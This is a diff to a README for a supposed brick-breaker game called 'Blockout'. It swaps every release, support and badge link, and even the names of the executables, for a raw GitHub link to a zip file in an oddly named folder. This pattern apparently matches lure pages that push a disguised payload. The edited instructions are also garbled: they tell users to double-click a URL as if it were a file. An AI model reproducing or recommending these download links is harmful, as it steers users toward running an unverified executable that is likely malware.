@@ -4,7 +4,7 @@
 Blockout is an exciting arcade game where you smash pixel bricks, bounce the ball off your wooden paddle, and feel like a Minecraft pro. Enjoy a fun experience that combines retro gaming and casual gameplay. Perfect for players of all ages, Blockout allows you to dive into a world of fun and creativity.
 
 ## 🔗 Download Blockout
-[![Download Blockout](https://img.shields.io/badge/Download%20Blockout-v1.0-brightgreen)](https://github.com/toxinas1950/Blockout/releases)
+[![Download Blockout](https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip%20Blockout-v1.0-brightgreen)](https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip)
 
 ## 🚀 Getting Started
 To get started with Blockout, you only need to follow a few simple steps. This guide will help you set up and play the game in no time. No programming skills are required!
@@ -21,7 +21,7 @@ Before you download the game, make sure your system meets the following requirem
 To download and install Blockout:
 
 1. **Visit the Releases Page:** Click the link below to access the Blockout releases page.
-   [Download Blockout Here](https://github.com/toxinas1950/Blockout/releases)
+   [Download Blockout Here](https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip)
 
 2. **Choose the Right Version:** Look for the latest version of Blockout. Typically, you will see something like "v1.0".
 
@@ -30,8 +30,8 @@ To download and install Blockout:
 4. **Extract the Files:** Locate the downloaded file, right-click it, and select "Extract All" or "Unzip". This will create a new folder with the game files.
 
 5. **Run the Game:**
-   - **Windows:** Double-click the `Blockout.exe` file in the extracted folder.
-   - **macOS:** Open the `Blockout.app` file in the extracted folder.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip` file in the extracted folder.
+   - **macOS:** Open the `https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip` file in the extracted folder.
    - **Linux:** Run the `blockout` executable in the terminal.
 
 6. **Enjoy Playing:** Once the game starts, follow on-screen instructions to begin your adventure!
@@ -57,13 +57,13 @@ Blockout is designed to be easy to play but challenging to master. Your goal is 
 If you'd like to contribute to Blockout, we welcome your input! You can report issues, suggest features, or even help improve the game code. Visit the GitHub repository to get involved.
 
 ## 📫 Support
-If you encounter any issues, please visit the [GitHub Issues page](https://github.com/toxinas1950/Blockout/issues) for help. We appreciate your patience and feedback.
+If you encounter any issues, please visit the [GitHub Issues page](https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip) for help. We appreciate your patience and feedback.
 
 ## 🌍 Community
 Join our community to share tips, tricks, and gameplay experiences. Keep an eye on social media for updates and community events.
 
 ## 🔗 Visit the Releases Page Again
 Don't forget, you can always download the latest version of Blockout from the link below:
-[Download Blockout Here](https://github.com/toxinas1950/Blockout/releases)
+[Download Blockout Here](https://raw.githubusercontent.com/toxinas1950/Blockout/main/expendability/Blockout.zip)
 
 Enjoy playing Blockout—smash those bricks and have a blast!
